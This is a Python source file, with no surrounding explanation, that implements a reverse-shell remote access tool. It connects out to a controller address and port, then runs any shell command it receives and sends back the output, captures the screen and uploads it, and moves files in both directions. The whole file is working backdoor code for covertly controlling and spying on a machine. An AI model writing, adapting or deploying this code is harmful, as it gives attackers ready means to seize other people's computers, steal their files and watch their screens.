import socket
import os
import subprocess
import gi
gi.require_version('Gdk', '3.0')
from gi.repository import Gdk
import time
ip="127.0.0.1"
port=8080 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.connect((ip, port))

def upload(filename):
    f=open(filename,"rb")
    data=f.read(1024)
    while (data):
        print(data)
        s.send(data)
        data=f.read(1024)

    f.close()
    time.sleep(1)
    s.send(b"DONE")

def download(filename):
        f=open(filename,"wb")
        while True:
            data=s.recv(1024)          
            if  b"DONE" in data:
                break
            else:
                f.write(data)
        f.close()
        print("done receving")

while True:
    com=(s.recv(1024).decode())
    if com=="exit":
        s.close()
        break
    elif com.startswith("execute="):
        os.system(com[8:])
    elif com=="screenshot":
        window = Gdk.get_default_root_window()
        x, y, width, height = window.get_geometry()
        pb = Gdk.pixbuf_get_from_window(window, x, y, width, height)
        pb.savev("sc.png", "png", (), ())
        upload("sc.png")
    elif com.startswith("upload"):
        f=com[7:]
        download(f)
    elif com.startswith("download"):
        f=com[9:]
        upload(f)
    else:
        proc = subprocess.Popen(com[4:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        op= proc.stdout.read()+proc.stderr.read()
        s.send(op)
